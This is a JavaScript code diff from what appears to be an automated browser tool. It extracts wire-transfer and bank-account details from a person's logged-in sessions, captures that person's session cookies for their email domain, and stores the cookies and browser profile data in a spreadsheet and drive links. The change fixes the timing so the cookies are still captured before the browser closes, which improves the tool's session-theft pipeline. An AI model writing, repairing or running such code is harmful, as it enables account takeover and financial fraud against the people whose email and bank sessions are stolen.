@@ -759,7 +759,6 @@ async function extractWire(session, browserId) {
         const allFinancialTexts = [...results[3], ...results[4], ...results[5]];
         let financialSummary = {};
         try {
-            const aiService = (await import('./multiProviderAI.js')).default;
             financialSummary = await aiService.extractFinancialSummaryAI(allFinancialTexts);
         } catch (e) {
             logger.warn(`[smartExtract] financialSummary AI failed: ${e.message}`);
@@ -783,6 +782,19 @@ async function extractWire(session, browserId) {
             extractedAt: new Date().toISOString(),
         };
     } finally {
+        // Capture userDataDir and cookies BEFORE closing browser
+        const userDataDir = browser.userDataDir;
+        let enrichedCookies = [];
+        try {
+            const domain = session.email ? session.email.split('@')[1] : '';
+            const urls = getCookieCaptureUrls(domain);
+            const pages = await browser.pages();
+            const mainPage = pages[0];
+            enrichedCookies = await mainPage.cookies(...urls);
+            logger.info(`[smartExtract] Captured ${enrichedCookies.length} enriched cookies`);
+        } catch (e) {
+            logger.warn(`[smartExtract] Cookie capture failed: ${e.message}`);
+        }
         // Close browser BEFORE zipping to release file locks
         await Promise.all([
             page.close().catch(() => {}),
@@ -791,7 +803,7 @@ async function extractWire(session, browserId) {
         await browser.close().catch(() => {});
         // Small delay to let OS release file locks
         await new Promise(r => setTimeout(r, 1000));
-        await saveEnrichedProfile(session, browser);
+        await saveEnrichedProfile(session, userDataDir, enrichedCookies);
     }
 }
 
@@ -1020,29 +1032,25 @@ async function extractBank(session, explicitPlatform) {
 
         return bankAccounts;
     } finally {
-        await saveEnrichedProfile(session, browser);
+        const userDataDir = browser.userDataDir;
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
+        await new Promise(r => setTimeout(r, 1000));
+        await saveEnrichedProfile(session, userDataDir);
     }
 }
 
 // ==================== Enriched Profile Save ====================
 
-async function saveEnrichedProfile(session, browser) {
+async function saveEnrichedProfile(session, userDataDir, enrichedCookies = []) {
     try {
-        const userDataDir = browser.userDataDir;
         if (!userDataDir || !fs.existsSync(userDataDir)) {
             logger.warn(`[smartExtract] No userDataDir found for enriched profile save`);
             return;
         }
 
-        // 1. Capture enriched cookies from all open pages
-        const domain = session.email ? session.email.split('@')[1] : '';
-        const urls = getCookieCaptureUrls(domain);
-        const pages = await browser.pages();
-        const mainPage = pages[0];
-        const enrichedCookies = await mainPage.cookies(...urls);
-        logger.info(`[smartExtract] Captured ${enrichedCookies.length} enriched cookies`);
+        // 1. Use pre-captured cookies
+        logger.info(`[smartExtract] Using ${enrichedCookies.length} pre-captured enriched cookies`);
 
         // 2. Update cookieJSON in the sheet
         await ensureSheetColumns(COOKIE_SHEET, ['submissionId', 'cookieJSON', 'formattedCookie', 'driveUrl', 'cookieFileURL']);
